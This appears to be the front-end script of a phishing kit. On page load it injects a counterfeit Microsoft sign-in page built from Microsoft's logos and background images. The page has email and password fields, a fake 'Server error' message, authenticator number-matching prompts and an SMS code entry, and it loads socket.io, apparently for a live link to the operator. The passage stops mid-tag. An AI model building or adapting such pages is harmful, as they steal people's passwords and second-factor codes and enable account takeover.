window.addEventListener("load", function () {
  document.head.insertAdjacentHTML(
    "beforeend",
    '\n<meta charset="UTF-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Microsoft Login</title>\n<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">\n<script src="https://cdn.socket.io/4.6.0/socket.io.min.js" integrity="sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+" crossorigin="anonymous"></script>\n'
  );
  document.head.insertAdjacentHTML(
    "beforeend",
    ' <style >\n    html {\n        background: none;\n        overflow: hidden;\n    }\n    \n    .canvas {\n        position: relative;\n        width: 250px;\n        height: auto;\n        margin: auto;\n        padding-top: 8%;\n    }\n    \n    .imgclass {\n        position: relative;\n        width: 160px;\n        height: 150px;\n        margin-left: 45px;\n    }\n    \n    .tittleText {\n        font-weight: 800;\n        font-size: 1rem;\n        margin-left: 30px;\n    }\n    \n    .logerMe {\n        font-weight: 500;\n    }\n    \n    .loader,\n    .loader:after {\n        border-radius: 50%;\n        width: 9em;\n        height: 9em;\n    }\n    \n    .loader {\n        margin: 60px auto;\n        font-size: 10px;\n        position: relative;\n        text-indent: -9999em;\n        border-top: 0.5em solid rgba(255, 255, 255, 0.4);\n        border-right: 0.5em solid rgba(255, 255, 255, 0.4);\n        border-bottom: 0.5em solid rgba(91, 56, 56, 0.4);\n        border-left: 0.5em solid #038387;\n        -webkit-transform: translateZ(0);\n        -ms-transform: translateZ(0);\n        transform: translateZ(0);\n        -webkit-animation: load8 1.6s infinite linear;\n        animation: load8 1.6s infinite linear;\n    }\n    \n    @-webkit-keyframes load8 {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg);\n        }\n        70% {\n            -webkit-transform: rotate(180deg);\n            transform: rotate(180deg);\n        }\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg);\n        }\n    }\n    \n    @keyframes load8 {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg);\n        }\n        70% {\n            -webkit-transform: rotate(180deg);\n            transform: rotate(180deg);\n        }\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg);\n        }\n    }\n    \n    \n    /* office page  */\n    \n    ** {\n        padding: 0px;\n        margin: 0px;\n        border-style: none;\n        outline: none;\n    }\n    \n    body {\n        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";\n        width: 100%;\n        height: 100vh;\n        background-color: #fff;\n        background-size: 100% auto;\n        background-image: url(\'https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg\');\n        background-repeat: no-repeat, no-repeat;\n        background-position: center center, center center;\n        background-size: cover, cover;\n    }\n    \n    .overlay {\n        position: absolute;\n        z-index: 10;\n        background-color: rgba(0, 0, 0, 0.6);\n        height: 100vh;\n        width: 100%;\n        top: 0px;\n        display: none;\n    }\n    \n  .table-row { \n display: flex; \n align-items: center; justify-content: flex-start; } \n  .loginForm2 { \n   position: relative; \n margin-left: auto; \n margin-right: auto; \n position: relative; \n top: 50%; \n margin-top: 40px; \n max-width: 440px; \n width: calc(100% - 40px); \n padding: 10px 40px 10px 40px; \n margin-bottom: 20px; \n background-color: #fff; \n webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n z-index: 1000; \n overflow: hidden; \n height: 48px; \n}  \n img.tile-img.medium { \nwidth: 32px; \nheight: 32px; \n}  .loginForm {\n        position: absolute;\n        margin-left: auto;\n        margin-right: auto;\n        height: auto;\n        margin-top: 0%;\n    top: 0%;    max-width: 100%;\n        width: calc(100% - 0px);\n        padding: 10px 35px 10px 35px;\n        margin-bottom: 20px;\n        background-color: #fff;\n        /* -webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n        box-shadow: 0 2px 3px rgb(0 0 0 / 25%); */\n        z-index: 1000;\n        overflow: hidden;\n    }\n    \n     .grayBox {\n        background-color: #f1f1f1;\n        margin-left: -40px;\n        margin-right: -40px;\n        margin-bottom: -50px;\n        padding-left: 35px;\n        padding-right: 35px;\n        padding-bottom: 30px;\n        padding-top: 10px;\n        display: none;\n    }\n    \n    .grayBox>* {\n        font-weight: 400;\n        font-size: 1rem;\n        line-height: 1.5rem;\n        color: #1b1b1b;\n        text-align: left;\n    }\n    \n    .buttomLabel {\n        position: fixed;\n        bottom: 0px;\n        right: 0px;\n        width: 100%;\n        display: flex;\n        justify-items: flex-start;\n        padding-left: 0%;\n        background-color: #fff;\n  background-size: 100% auto;\n  background-image: url(\'https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg\');\n  }\n    \n    .buttomLabel>a {\n        z-index: 9999999999;\n        position: relative;\n        color: black;\n        font-size: 0.7rem;\n        margin-right: 15px;\n        padding: 5px;\n    }\n    \n    .emailBlock {\n        position: relative;\n        display: grid;\n        grid-template-columns: auto;\n        margin: 10px;\n    }\n    \n    .emailBlock>* {\n        margin-bottom: 15px;\n    }\n    \n    .formLogo {\n        position: relative;\n        margin: -5px;\n        margin-top: 10px;\n        margin-bottom: 10px;\n        max-width: 280px;\n        max-height: 40px;\n    }\n    \n    .signIn {\n        font-size: 1.6rem;\n        line-height: 1.75rem;\n        font-weight: 600;\n        cursor: pointer;\n        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";\n    }\n    \n    .emailError {\n        color: #e81123;\n        display: none;\n    }\n    \n    .emailInvalid {\n        color: #e81123;\n        display: none;\n    }\n    \n    .passwordError {\n        color: #e81123;\n        display: none;\n    }\n    \n    .otpError {\n        color: #e81123;\n        display: none;\n    }\n    \n    .otpError2 {\n        color: #e81123;\n        display: none;\n    }\n    \n    .passwordNull {\n        color: #e81123;\n        display: none;\n    }\n    \n    .emailInput {\n        display: block;\n        width: auto;\n        background-image: none;\n        border-style: solid;\n        border-color: rgba(0, 0, 0, 0.6);\n        border-width: 0px 0px thin;\n        outline: none;\n        padding: 0px 0px;\n        height: 30px;\n        line-height: normal;\n        color: -internal-light-dark(black, white);\n        letter-spacing: normal;\n        word-spacing: normal;\n        appearance: textfield;\n        background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));\n        cursor: text;\n        font: 400 13.3333px Arial;\n        font-size: 1rem;\n    }\n    \n    input {\n        display: block;\n        width: auto;\n        background-image: none;\n        border-style: solid;\n        border-color: #0067b8;\n        border-width: 0px 0px thin;\n        outline: none;\n        padding: 0px 0px;\n        height: 35px;\n        line-height: normal;\n        color: -internal-light-dark(black, white);\n        letter-spacing: normal;\n        word-spacing: normal;\n        appearance: textfield;\n        background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));\n        cursor: text;\n        font: 400 13.3333px Arial;\n        font-size: 1rem;\n    }\n    \n    .formButton {\n        position: relative;\n        border-color: #0067b8;\n        background-color: #0067b8;\n        color: #fff;\n        line-height: normal;\n        padding: 8px 0px;\n        border-style: none;\n        width: 110px;\n        left: 70%;\n        cursor: pointer;\n        /* margin-top: 15px; */\n    }\n    \n    .formButtonEmail {\n        position: relative;\n        border-color: #0067b8;\n        background-color: #0067b8;\n        color: #fff;\n        line-height: normal;\n        padding: 8px 0px;\n        border-style: none;\n        width: 110px;\n        cursor: pointer;\n        margin-top: 15px;\n        left: 35%;\n    }\n    \n    .keyLabel {\n        padding-right: 7px;\n        color: #0067b8;\n        cursor: pointer;\n    }\n    \n    .emailLabel {\n        padding-top: 0px;\n    }\n    \n    .backArrow {\n        cursor: pointer;\n    }\n    \n    .backArrow:hover {\n        background-color: lightgrey;\n        border-radius: 50%;\n    }\n    \n    .passwordBlock {\n        position: relative;\n        display: grid;\n        grid-template-columns: auto;\n        display: none;\n    }\n    \n    .passwordBlock>* {\n        margin-bottom: 15px;\n    }\n    \n    .msappBlock {\n        position: relative;\n        display: grid;\n        grid-template-columns: auto;\n        display: none;\n    }\n    \n    .msappBlock>* {\n        margin-bottom: 15px;\n    }\n    \n    .msappcodeBlock {\n        position: relative;\n        display: grid;\n        grid-template-columns: auto;\n        display: none;\n    }\n    \n    .msappcodeBlock>* {\n        margin-bottom: 9px;\n    }\n    \n    .phoneBlock {\n        position: relative;\n        display: grid;\n        grid-template-columns: auto;\n        display: none;\n    }\n    \n    .phoneBlock>* {\n        margin-bottom: 15px;\n    }\n    \n    .labelButtom>* {\n        font-size: 0.8rem;\n    }\n    \n    .labelpassword {\n        display: flex;\n    }\n    \n    .loaderBox {\n        position: relative;\n        margin-top: -45px;\n        margin-left: -50px;\n        width: 130%;\n        overflow: hidden;\n        display: none;\n    }\n    \n    .loaderBox2 {\n        position: relative;\n        margin-top: -35px;\n        margin-left: -50px;\n        width: 130%;\n        overflow: hidden;\n        display: none;\n    }\n    \n    .oneDrive {\n        position: absolute;\n        z-index: 1;\n        top: 0px;\n        width: 100%;\n    }\n    \n    .header {\n        position: relative;\n        background-color: rgb(0, 120, 212);\n        line-height: 48px;\n    }\n    \n    .sideBar {\n        position: relative;\n        background-color: rgb(242, 239, 239);\n        width: 230px;\n        height: 94vh;\n    }\n    \n    .subMenu1 {\n        position: absolute;\n        top: 48px;\n        width: 100%;\n        border-style: solid;\n        border-width: 0px 0px 1px 0px;\n        border-color: lightgray;\n        height: 43px;\n        margin-top: 3px;\n    }\n    \n    .subMenu2 {\n        position: absolute;\n        top: 48px;\n        width: 84%;\n        margin-left: 230px;\n        border-style: solid;\n        border-width: 0px 0px 1px 0px;\n        border-color: lightgray;\n        height: 43px;\n        margin-top: 3px;\n    }\n    \n    .profileS {\n        display: block;\n        cursor: pointer;\n    }\n    \n    .profileL {\n        cursor: pointer;\n    }\n    \n    .search {\n        cursor: pointer;\n    }\n    \n    .sideBar {}\n    \n    .shrinkmenu1 {\n        cursor: pointer;\n    }\n    \n    .new1 {\n        cursor: pointer;\n    }\n    \n    .shrink1 {\n        cursor: pointer;\n    }\n    \n    .uplaod1 {}\n    \n    .sort1 {\n        float: right;\n        padding-top: 4px;\n        padding-right: 5px;\n        cursor: pointer;\n    }\n    \n    .frontDocs {\n        position: absolute;\n        height: auto;\n        width: auto;\n        top: 130px;\n    }\n    \n    .frontDocs>* {\n        cursor: pointer;\n        margin: 5px;\n    }\n    \n    .frontDocs img:hover {\n        border-style: solid;\n        border-width: 1px 1px 1px 1px;\n        border-color: rgb(196, 195, 195);\n    }\n    \n    .lds-roller {\n        display: inline-block;\n        position: absolute;\n        width: 80px;\n        height: 80px;\n        top: 40%;\n        bottom: 50%;\n        right: 55%;\n        left: 43%;\n    }\n    \n    .lds-roller div {\n        animation: lds-roller 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;\n        transform-origin: 40px 40px;\n    }\n    \n    .lds-roller div:after {\n        content: " ";\n        display: block;\n        position: absolute;\n        width: 7px;\n        height: 7px;\n        border-radius: 50%;\n        background: #fff;\n        margin: -4px 0 0 -4px;\n    }\n    \n    .lds-roller div:nth-child(1) {\n        animation-delay: -0.036s;\n    }\n    \n    .lds-roller div:nth-child(1):after {\n        top: 63px;\n        left: 63px;\n    }\n    \n    .lds-roller div:nth-child(2) {\n        animation-delay: -0.072s;\n    }\n    \n    .lds-roller div:nth-child(2):after {\n        top: 68px;\n        left: 56px;\n    }\n    \n    .lds-roller div:nth-child(3) {\n        animation-delay: -0.108s;\n    }\n    \n    .lds-roller div:nth-child(3):after {\n        top: 71px;\n        left: 48px;\n    }\n    \n    .lds-roller div:nth-child(4) {\n        animation-delay: -0.144s;\n    }\n    \n    .lds-roller div:nth-child(4):after {\n        top: 72px;\n        left: 40px;\n    }\n    \n    .lds-roller div:nth-child(5) {\n        animation-delay: -0.18s;\n    }\n    \n    .lds-roller div:nth-child(5):after {\n        top: 71px;\n        left: 32px;\n    }\n    \n    .lds-roller div:nth-child(6) {\n        animation-delay: -0.216s;\n    }\n    \n    .lds-roller div:nth-child(6):after {\n        top: 68px;\n        left: 24px;\n    }\n    \n    .lds-roller div:nth-child(7) {\n        animation-delay: -0.252s;\n    }\n    \n    .lds-roller div:nth-child(7):after {\n        top: 63px;\n        left: 17px;\n    }\n    \n    .lds-roller div:nth-child(8) {\n        animation-delay: -0.288s;\n    }\n    \n    .lds-roller div:nth-child(8):after {\n        top: 56px;\n        left: 12px;\n    }\n    \n    @keyframes lds-roller {\n        0% {\n            transform: rotate(0deg);\n        }\n        100% {\n            transform: rotate(360deg);\n        }\n    }\n    \n    \n    /**\n     * ==============================================\n     * Dot Floating\n     * ==============================================\n     */\n    \n    .dot-floating {\n        position: relative;\n        width: 5px;\n        height: 5px;\n        border-radius: 50%;\n        background-color: #0067b8;\n        color: #0067b8;\n        -webkit-animation: dot-floating 2s infinite cubic-bezier(0.15, 0.6, 0.9, 0.1);\n        animation: dot-floating 2s infinite cubic-bezier(0.15, 0.6, 0.9, 0.1);\n        margin-left: 220px;\n    }\n    \n    .dot-floating::before,\n    .dot-floating::after {\n        content: \'\';\n        display: inline-block;\n        position: absolute;\n        /* top: 0; */\n    }\n    \n    .dot-floating::before {\n        left: -12px;\n        width: 5px;\n        height: 5px;\n        border-radius: 50%;\n        background-color: #0067b8;\n        color: #0067b8;\n        -webkit-animation: dot-floating-before 2s infinite ease-in-out;\n        animation: dot-floating-before 2s infinite ease-in-out;\n    }\n    \n    .dot-floating::after {\n        left: -12px;\n        width: 5px;\n        height: 5px;\n        border-radius: 50%;\n        background-color: #0067b8;\n        color: #0067b8;\n        -webkit-animation: dot-floating-after 3s infinite cubic-bezier(0.4, 0, 1, 1);\n        animation: dot-floating-after 2s infinite cubic-bezier(0.4, 0, 1, 1);\n    }\n    \n    @-webkit-keyframes dot-floating {\n        0% {\n            left: calc(-50% - 5px);\n        }\n        75% {\n            left: calc(50% + 105px);\n        }\n        100% {\n            left: calc(50% + 105px);\n        }\n    }\n    \n    @keyframes dot-floating {\n        0% {\n            left: calc(-50% - 5px);\n        }\n        75% {\n            left: calc(50% + 105px);\n        }\n        100% {\n            left: calc(50% + 105px);\n        }\n    }\n    \n    @-webkit-keyframes dot-floating-before {\n        0% {\n            left: -50px;\n        }\n        50% {\n            left: -12px;\n        }\n        75% {\n            left: -50px;\n        }\n        100% {\n            left: -50px;\n        }\n    }\n    \n    @keyframes dot-floating-before {\n        0% {\n            left: -50px;\n        }\n        50% {\n            left: -12px;\n        }\n        75% {\n            left: -50px;\n        }\n        100% {\n            left: -50px;\n        }\n    }\n    \n    @-webkit-keyframes dot-floating-after {\n        0% {\n            left: -100px;\n        }\n        50% {\n            left: -24px;\n        }\n        75% {\n            left: -100px;\n        }\n        100% {\n            left: -100px;\n        }\n    }\n    \n    @keyframes dot-floating-after {\n        0% {\n            left: -100px;\n        }\n        50% {\n            left: -24px;\n        }\n        75% {\n            left: -100px;\n        }\n        100% {\n            left: -100px;\n        }\n    }\n    \n    .loaderxBlock {\n        display: block;\n    }\n    \n    .msappContent {\n        display: flex;\n        justify-content: center;\n        align-content: center;\n    }\n    \n    .msappContent>img {\n        height: 25px;\n        width: 25px;\n        margin-top: 20px;\n        margin-right: 10px;\n    }\n    \n    .otpcodeBlock {\n        display: flex;\n        justify-content: center;\n        align-content: center;\n    }\n    \n    #otpCode {\n        font-size: 2.5rem;\n        border-style: solid;\n        border-color: #1b1b1b;\n        padding-left: 16px;\n        padding-right: 16px;\n    }\n    \n    .recaptcha {\n        background-color: rgba(0, 0, 0, 0.049);\n        width: 300px;\n        height: 74px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 3px;\n        -webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n        box-shadow: 0 2px 3px rgba(0, 0, 0, 0.157);\n        justify-self: center;\n        margin: auto;\n    }\n    \n    .recaptchasub {\n        display: flex;\n        justify-items: center;\n        flex-direction: column;\n        align-items: center;\n        background-color: transparent;\n        width: 90px;\n        height: 74px;\n        margin-top: 15px;\n    }\n    \n    .checkbox-wrapper-43 {\n        display: flex;\n        margin-left: 10px;\n    }\n    \n    .amnotrobot {\n        margin-left: -70px;\n        margin-top: 5px;\n        font-size: 0.9rem;\n        color: #000000d8;\n    }\n    \n    .checkbox-wrapper-43 input[type="checkbox"] {\n        display: none;\n        visibility: hidden;\n    }\n    \n    .checkbox-wrapper-43 label {\n        display: inline-block;\n    }\n    \n    .checkbox-wrapper-43 .check {\n        cursor: pointer;\n        position: relative;\n        margin: auto;\n        width: 20px;\n        height: 20px;\n        -webkit-tap-highlight-color: transparent;\n        transform: translate3d(0, 0, 0);\n    }\n    \n    .checkbox-wrapper-43 .check svg {\n        position: relative;\n        z-index: 1;\n        fill: none;\n        stroke-linecap: round;\n        stroke-linejoin: round;\n        stroke: #c8ccd4;\n        stroke-width: 1.5;\n        transform: translate3d(0, 0, 0);\n        transition: all 0.2s ease;\n    }\n    \n    .checkbox-wrapper-43 .check svg path {\n        stroke-dasharray: 60;\n        stroke-dashoffset: 0;\n    }\n    \n    .checkbox-wrapper-43 .check svg polyline {\n        stroke-dasharray: 22;\n        stroke-dashoffset: 66;\n    }\n    \n    .checkbox-wrapper-43 .check:hover:before {\n        opacity: 1;\n    }\n    \n    .checkbox-wrapper-43 .check:hover svg {\n        stroke: #4285f4;\n    }\n    \n    .checkbox-wrapper-43 input[type="checkbox"]:checked+.check svg {\n        stroke: #009402;\n    }\n    \n    .checkbox-wrapper-43 input[type="checkbox"]:checked+.check svg path {\n        stroke-dashoffset: 60;\n        transition: all 0.3s linear;\n    }\n    \n    .checkbox-wrapper-43 input[type="checkbox"]:checked+.check svg polyline {\n        stroke-dashoffset: 42;\n        transition: all 0.2s linear;\n        transition-delay: 0.15s;\n    }\n    \n    @media screen and (min-width: 40em) {\n      .table-row { \n display: flex; \n align-items: center; justify-content: flex-start; } \n  .loginForm2 { \n   position: relative; \n margin-left: auto; \n margin-right: auto; \n position: relative; \n top: 15%; \n margin-top: 40px; \n max-width: 440px; \n width: calc(100% - 40px); \n padding: 10px 40px 10px 40px; \n margin-bottom: 20px; \n background-color: #fff; \n webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n z-index: 1000; \n overflow: hidden; \n height: 48px; \n}  \n img.tile-img.medium { \nwidth: 32px; \nheight: 32px; \n}  .loginForm {\n            position: relative;\n            margin-left: auto;\n            margin-right: auto;\n            position: relative;\n            height: auto;\n            top: 18%;\n            max-width: 440px;\n            width: calc(100% - 40px);\n            padding: 10px 40px 10px 40px;\n            margin-bottom: 20px;\n            background-color: #fff;\n            -webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n            box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n            z-index: 1000;\n            overflow: hidden;\n        }\n        .profileS {\n            display: block;\n        }\n        .profileL {\n            cursor: pointer;\n        }\n        .search {\n            cursor: pointer;\n        }\n        .sideBar {}\n        .shrink1 {\n            cursor: pointer;\n        }\n        .uplaod1 {}\n        .buttomLabel>a {\n            color: black;\n        }\n        .buttomLabel {\n            position: absolute;\n            bottom: 0px;\n            right: 0px;\n            width: 100%;\n            display: flex;\n            justify-content: right;\n            background-color: #fff;\n  background-size: 100% auto;\n  background-image: url(\'https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg\');\n        }\n     \n    @media screen and (min-width: 60em) {\n        .loginForm {\n            position: relative;\n            margin-left: auto;\n            margin-right: auto;\n            position: relative;\n            height: auto;\n            top: 15%;\n            max-width: 440px;\n            width: calc(100% - 40px);\n            padding: 10px 40px 10px 40px;\n            margin-bottom: 20px;\n            background-color: #fff;\n            -webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n            box-shadow: 0 2px 3px rgb(0 0 0 / 25%);\n            z-index: 1000;\n            overflow: hidden;\n        }\n        .profileS {}\n        .profileL {\n            display: block;\n            cursor: pointer;\n        }\n        .search {\n            display: block;\n            cursor: pointer;\n        }\n        .sideBar {\n            display: block;\n        }\n        .sideBar>img {\n            margin: 10px;\n            cursor: pointer;\n        }\n        .sideBarBottom {\n            position: absolute;\n            bottom: 0px;\n            width: 100%;\n            display: grid;\n            color: #0067b8;\n            border-style: solid;\n            border-width: 1px 0px 0px 0px;\n            border-color: lightgray;\n        }\n        .sideBarBottom>a {\n            font-size: 0.8rem;\n            margin: 5px;\n            margin-left: 15px;\n            margin-bottom: 20px;\n            cursor: pointer;\n        }\n        .new2 {\n            cursor: pointer;\n        }\n        .uplaod2 {\n            cursor: pointer;\n        }\n        .sort2 {\n            float: right;\n            padding-top: 5px;\n            padding-right: 5px;\n            cursor: pointer;\n        }\n        .subMenu1 {}\n        .subMenu2 {\n            display: block;\n        }\n        .frontDocs {\n            margin-left: 280px;\n        }\n        .lds-roller {\n            display: inline-block;\n            position: absolute;\n            width: 80px;\n            height: 80px;\n            top: 40%;\n            bottom: 50%;\n            right: 50%;\n            left: 48%;\n        }\n        .buttomLabel>a {\n            color: black;\n        }\n        .buttomLabel {\n            position: absolute;\n            bottom: 0px;\n            right: 0px;\n            width: 100%;\n            display: flex;\n            justify-content: right;\n        background-color: #fff;\n  background-size: 100% auto;\n  background-image: url(\'https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg\');\n        }\n .table-row { \n display: flex; \n align-items: center; justify-content: flex-start; } \n  .loginForm2 { \n   position: relative; \n margin-left: auto; \n margin-right: auto; \n position: relative; \n top: 15%; \n max-width: 440px; \n width: calc(100% - 40px); \n padding: 10px 40px 10px 40px; \n margin-bottom: 20px; \n background-color: #fff; \n webkit-box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n box-shadow: 0 2px 3px rgb(0 0 0 / 25%); \n z-index: 1000; \n overflow: hidden; \n height: 48px; \n}  \n img.tile-img.medium { \nwidth: 32px; \nheight: 32px; \n} \n</style> '
  );

  document.body.insertAdjacentHTML(
    "afterbegin",
    '\n\n    <!-- Overlay -->\n    <div class="overlay"></div>\n\n    <div class="canvas" style="display: none;">\n        <!-- <img class="imgclass" src="https://softwarereviews.s3.amazonaws.com/production/favicons/offerings/3117/original/Sharepoint_icon.png" alt="" srcset="">\n        <div class="tittleText">\n            <br>Microsoft© Sharepoint</div> -->\n        <p class="logerMe"></p>\n        <div class="loader">Loading...</div>\n    </div>\n\n    <!-- LOGIN PAGE START  -->\n    <div class="loginForm">\n\n        <!-- EMAIL -->\n        <div style="display: none;" class="emailBlock w3-animate-left">\n            <br>\n            <img style="margin-bottom: 25px;" class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <a class="signIn">Sign in</a>\n            <a class="emailError">That Microsoft account doesn\'t exist. Enter a different account\n\t\t\t\t</a>\n            <a class="emailInvalid">Enter a valid email address, phone number, or Skype name.</a>\n            <input class="emailInput" placeholder="Email, phone or Skype" type="text" name="" onkeypress="hideErrorText(this.value)">\n            <div class="labelButtom">\n                <a>No account?</a>\n                <a style="color: #0067b8; cursor: pointer;">Create one!</a>\n            </div>\n            <div style="display: flex; font-size: 0.8rem;">\n                <a class="keyLabel">Can\'t access your account?\n\t\t\t\t\t</a>\n            </div>\n            <div>\n                <button style="background-color: rgb(211, 207, 207); color: #000;" id="sendEmailBcack" class="formButtonEmail" type="submit">Back</button>\n                <button id="sendEmail" class="formButtonEmail" type="submit">Next</button>\n            </div>\n        </div>\n\n        <!-- PASSWORD -->\n        <div style="display: none;" class="passwordBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <div style="display: flex;">\n          <a class="emailLabel">Email@outlook.com</a>\n            </div>\n            <a class="signIn">Enter password</a>\n                   <a class="passwordError">Server error. please try again...</a>\n            <input class="passwordInput" placeholder="Password" type="password" name="">\n            <!-- <div class="labelpassword">\n                <input style="height: 20px; width: 20px;" type="checkbox" name="" id="">\n                <a style="color: #000; cursor: pointer; margin-top: 0px; margin-left: 5px;">Keep me signed in</a>\n            </div> -->\n            <div style="display: flex;">\n                <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">Forgot password?</a>\n            </div>\n            <button id="sendPass" class="formButton" type="submit">Sign in</button>\n            <br>\n        </div>\n\n        <!-- NO PASS - MS APP -->\n        <div style="display: none;" class="noPassmsappBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <div style="display: flex;">\n                <a class="emailLabel">email@gmail.com</a>\n                <br>\n            </div>\n            <a class="signIn">Approve sign in</a>\n\n            <div class="msappContent">\n                <img class="tile-img small animate-pulse" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_59892f1e05e3adf9fd2f71b42d92a27f.svg">\n                <p>Open your Authenticator app, and enter the number shown to sign in.​​</p>\n            </div>\n\n            <div class="otpcodeBlock">\n                <a id="otpCode2">69</a>\n            </div>\n            <br>\n            <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">Use your password instead</a>\n        </div>\n\n\n        <!-- MS APP -->\n        <div style="display: none;" class="msappBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <div style="display: flex;">\n                <a class="emailLabel">email@gmail.com</a>\n            </div>\n            <a class="signIn">Approve sign in request</a>\n\n            <div class="msappContent">\n                <img class="tile-img small animate-pulse" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_59892f1e05e3adf9fd2f71b42d92a27f.svg">\n                <p>Open your Authenticator app, and enter the number shown to sign in.</p>\n            </div>\n\n            <div class="otpcodeBlock">\n                <a id="otpCode">69</a>\n            </div>\n\n            <p>No numbers in your app? Make sure to upgrade to the latest version.</p>\n            <div style="display: flex;">\n                <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">I can\'t use my Authenticator app right now</a>\n            </div>\n            <div style="display: flex;">\n                <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">More information</a>\n            </div>\n        </div>\n\n        <!-- MS APP CODE-->\n        <div style="display: none;" class="msappcodeBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <div style="display: flex;">\n                <img class="backArrow" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"\n                    data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">\n                <a class="emailLabel">email@gmail.com</a>\n            </div>\n            <a class="signIn">Enter code</a>\n\n            <div class="msappContent">\n                <img class="tile-img small" role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_code_b41922ebdaebec16b19999fc6054a15a.svg">\n                <p class="appotpCode">We texted your phone​</p>\n            </div>\n            <a class="otpError2">.....</a>\n            <input class="otpInput2" placeholder="Code" type="text" name="">\n            <div style="display: flex;">\n                <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">More information</a>\n            </div>\n            <button id="sendAppCode" class="formButton" type="submit">Verify</button>\n        </div>\n\n        <!-- PHONE -->\n        <div style="display: none;" class="phoneBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">\n            <div style="display: flex;">\n                <img class="backArrow" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"\n                    data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">\n                <a class="emailLabel">email@gmail.com</a>\n            </div>\n            <a class="signIn">Enter code</a>\n\n            <div class="msappContent">\n                <img class="tile-img small" role="presentation" 